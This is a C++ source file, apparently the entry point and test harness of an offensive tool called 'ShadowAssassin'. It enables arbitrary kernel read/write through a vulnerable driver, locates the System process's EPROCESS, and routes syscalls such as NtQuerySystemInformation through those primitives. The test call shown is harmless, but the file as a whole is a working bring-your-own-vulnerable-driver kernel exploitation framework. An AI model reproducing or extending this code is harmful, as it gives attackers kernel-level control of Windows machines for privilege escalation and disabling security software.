#include "shadowassassin.h"
#include "ReadWriteLibrary/VulnerableDriverReadWrite.h"
#include "offsets.h"


static bool IsValidKernelAddress(UINT64 addr) {
    return addr >= 0xFFFF800000000000ULL && addr <= 0xFFFFFFFFFFFFFFF0ULL;
}

static UINT64 Read64(VulnerableDriver& drv, UINT64 addr) {
    if (!IsValidKernelAddress(addr)) {
        DbgLog("[Read64] SKIP: non-canonical addr=0x%llX\n", addr);
        return 0;
    }
    UINT64 val = 0;
    drv.Read(&val, addr, sizeof(UINT64));
    return val;
}


int main() {
    DbgLog("=== ShadowAssassin init ===\n");

    VulnerableDriver driver;
    ShadowAssassin assassin;

    driver.EnablePrimitives();

    if (!driver.primitivesEnabled) {
        DbgLog("[main] FAIL: primitives not enabled\n");
        return 1;
    }

    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });

    UINT64 eprocess = assassin.Get_System_EPROCESS();
    if (!eprocess) { driver.CleanUp(); return 1; }

    assassin.SetEPROCESS(eprocess);
    if (!assassin.Initialize()) { driver.CleanUp(); return 1; }



    // --- Test 2: NtQuerySystemInformation (SystemBasicInformation) ---
    UINT64 outBuf = (UINT64)VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!outBuf) return 1;
    memset((void*)outBuf, 0, 0x1000);

    UINT64 sysInfoResult = assassin.CallSyscall("NtQuerySystemInformation", {
        0,       // SystemBasicInformation
        outBuf,  // user-mode output buffer
        0x40,   // size
        0        // ReturnLength ptr (NULL)
    });

    UINT32 pageSize    = *(UINT32*)(outBuf + 0x08); // PageSize (ULONG)
    UINT8  numCpus     = *(UINT8* )(outBuf + 0x38); // NumberOfProcessors (CCHAR)
    UINT64 maxUserAddr = *(UINT64*)(outBuf + 0x28); // MaximumUserModeAddress (ULONG_PTR)

    printf("[NtQuerySystemInformation] return=0x%llX  PageSize=0x%X  NumCpus=%u  MaxUserAddr=0x%llX\n",
        sysInfoResult, pageSize, numCpus, maxUserAddr);
    VirtualFree((void*)outBuf, 0, MEM_RELEASE);

    driver.CleanUp();
    DbgLog("[main] Done\n");
    return 0;
}
